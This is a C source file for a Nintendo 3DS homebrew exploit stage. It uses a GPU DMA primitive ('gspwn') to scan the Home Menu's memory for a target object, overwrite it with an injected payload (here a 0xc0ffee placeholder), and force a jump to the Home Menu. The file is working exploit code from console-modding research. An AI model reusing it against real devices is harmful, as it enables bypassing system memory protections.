#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/APT.h>
#include "text.h"

#include "../../../../build/constants.h"
#include "menu_microp_bin.h"
#include "decomp.h"

#define TOPFBADR1 ((u8*)CN_TOPFBADR1)
#define TOPFBADR2 ((u8*)CN_TOPFBADR2)

Handle *const gspHandle = (Handle*)CN_GSPHANDLE_ADR;
Handle *const srvHandle = (Handle*)CN_SRVHANDLE_ADR;
Result (*const _GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

#define _aptOpenSession() \
	svc_waitSynchronization1(aptLockHandle, U64_MAX);\
	_srv_getServiceHandle(srvHandle, &aptuHandle, "APT:U");\

#define _aptCloseSession()\
	svc_closeHandle(aptuHandle);\
	svc_releaseMutex(aptLockHandle);\

void doGspwn(u32* src, u32* dst, u32 size)
{
	Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue;
	u32 gxCommand[]=
	{
		0x00000004, //command header (SetTextureCopy)
		(u32)src, //source address
		(u32)dst, //destination address
		size, //size
		0x00000000, // dim in
		0x00000000, // dim out
		0x00000008, // flags
		0x00000000, //unused
	};

	u32** sharedGspCmdBuf=(u32**)(CN_GSPSHAREDBUF_ADR);
	nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(sharedGspCmdBuf, gxCommand);
}

void inject_payload(u32* linear_buffer, u32 target_address)
{
	u32 target_base = target_address & ~0xFF;
	u32 target_offset = target_address - target_base;

	//read menu memory
	{
		_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, linear_buffer, 0x00001000);
		
		doGspwn((u32*)(target_base), linear_buffer, 0x00001000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be read

	//patch memdump and write it
	{
		// u32* payload_src = (u32*)menu_microp_bin;
		// u32 payload_size = menu_microp_bin_size;

		u32* payload_dst = &(linear_buffer)[target_offset/4];

		//patch in payload
		int i;
		// for(i=0; i<payload_size/4; i++)
		for(i=0; i<0x200/4; i++)
		{
			// if(payload_src[i] < 0xBABE0000+0x100 && payload_src[i] > 0xBABE0000-0x100)
			// {
			// 	payload_dst[i] = payload_src[i] + target_address - 0xBABE0000;
			// }else if(payload_src[i] != 0xDEADCAFE) payload_dst[i] = payload_src[i];
			payload_dst[i] = 0xc0ffee;
		}

		_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, linear_buffer, 0x00001000);

		doGspwn(linear_buffer, (u32*)(target_base), 0x00001000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be written
}

Result _APT_AppletUtility(Handle* handle, u32* out, u32 a, u32 size1, u8* buf1, u32 size2, u8* buf2)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x4B00C2; //request header code
	cmdbuf[1]=a;
	cmdbuf[2]=size1;
	cmdbuf[3]=size2;
	cmdbuf[4]=(size1<<14)|0x402;
	cmdbuf[5]=(u32)buf1;
	
	cmdbuf[0+0x100/4]=(size2<<14)|2;
	cmdbuf[1+0x100/4]=(u32)buf2;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	if(out)*out=cmdbuf[2];

	return cmdbuf[1];
}

Result _APT_NotifyToWait(Handle* handle, u32 a)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x430040; //request header code
	cmdbuf[1]=a;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_ReceiveParameter(Handle* handle, u32 app_id)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0xd0080; //request header code
	cmdbuf[1]=app_id;
	cmdbuf[2]=0x0;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

// Result _APT_PrepareToCloseApplication(Handle* handle, u8 a)
// {
// 	u32* cmdbuf=getThreadCommandBuffer();
// 	cmdbuf[0]=0x220040; //request header code
// 	cmdbuf[1]=a;
	
// 	Result ret=0;
// 	if((ret=svc_sendSyncRequest(*handle)))return ret;

// 	return cmdbuf[1];
// }

// Result _APT_CloseApplication(Handle* handle, u32 a, u32 b, u32 c)
// {
// 	u32* cmdbuf=getThreadCommandBuffer();
// 	cmdbuf[0]=0x270044; //request header code
// 	cmdbuf[1]=a;
// 	cmdbuf[2]=0x0;
// 	cmdbuf[3]=b;
// 	cmdbuf[4]=(a<<14)|2;
// 	cmdbuf[5]=c;
	
// 	Result ret=0;
// 	if((ret=svc_sendSyncRequest(*handle)))return ret;

// 	return cmdbuf[1];
// }

Result _APT_PrepareToJumpToHomeMenu(Handle* handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x002B0000; //request header code
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_JumpToHomeMenu(Handle* handle, u32 a, u32 b, u32 c)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x002C0044; //request header code
	cmdbuf[1]=a;
	cmdbuf[2]=0x0;
	cmdbuf[3]=b;
	cmdbuf[4]=(a<<14)|2;
	cmdbuf[5]=c;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
{
	u8 l=_strlen(server);
	if(!out || !server || l>8)return -1;

	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x50100; //request header code
	_strcpy((char*)&cmdbuf[1], server);
	cmdbuf[3]=l;
	cmdbuf[4]=0x0;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	*out=cmdbuf[3];

	return cmdbuf[1];
}

Result _GSPGPU_ReleaseRight(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x170000; //request header code

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

int _main()
{
	u32* linear_buffer = (u32*)0x14100000;

	for(int i=0; i<0x46500*2;i++)((u8*)CN_TOPFBADR1)[i]=0x00;


	//search for target object in home menu's linear heap
	const u32 start_addr = FIRM_LINEARSYSTEM;
	const u32 end_addr = FIRM_LINEARSYSTEM + 0x01000000;
	const u32 block_size = 0x00010000;
	const u32 block_stride = block_size-0x100; // keep some overlap to make sure we don't miss anything

	int targetProcessIndex = 1;

	int cnt = 0;
	u32 block_start;
	u32 target_address = start_addr;
	for(block_start = start_addr; block_start < end_addr; block_start += block_stride)
	{
		//read menu memory
		{
			_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, linear_buffer, block_size);
			
			doGspwn((u32*)(block_start), linear_buffer, block_size);
		}

		svc_sleepThread(1000000); //sleep long enough for memory to be read

		int i;
		u32 end = block_size/4-0x10;
		for(i=0; i<end; i++)
		{
			const u32* adr = &(linear_buffer)[i];
			if(adr[2]==0x5544 && adr[3]==0x80 && adr[6]!=0x0 && adr[0x1F]==0x6E4C5F4E)break;
		}
		if(i<end)
		{
			target_address = block_start + i * 4;

			inject_payload(linear_buffer, target_address+0x18);

			block_start = target_address + 0x10 - block_stride;
			cnt++;
			break;
		}
	}

	if(cnt == 0) *(int*)NULL = 0xc0decafe;

	_GSPGPU_ReleaseRight(*gspHandle);

	Handle aptLockHandle = *((Handle*)CN_APTLOCKHANDLE_ADR);
	Handle aptuHandle = 0;

	u32 buf1;
	u8 buf2[4];

	_aptOpenSession();
	buf1 = 0x01;
	_APT_AppletUtility(&aptuHandle, NULL, 0x6, 0x4, (u8*)&buf1, 0x1, buf2);
	_aptCloseSession();

	_aptOpenSession();
	_APT_PrepareToJumpToHomeMenu(&aptuHandle);
	_aptCloseSession();

	_aptOpenSession();
	_APT_JumpToHomeMenu(&aptuHandle, 0x0, 0x0, 0x0);
	_aptCloseSession();

	_aptOpenSession();
	_APT_NotifyToWait(&aptuHandle, 0x300);
	_aptCloseSession();

	_aptOpenSession();
	buf1 = 0x00;
	_APT_AppletUtility(&aptuHandle, NULL, 0x4, 0x1, (u8*)&buf1, 0x1, buf2);
	_aptCloseSession();

	// svc_exitProcess();

	svc_sleepThread(0xFFFFFFFFFFFFFFFFLL);

	while(1);

	return 0;
}
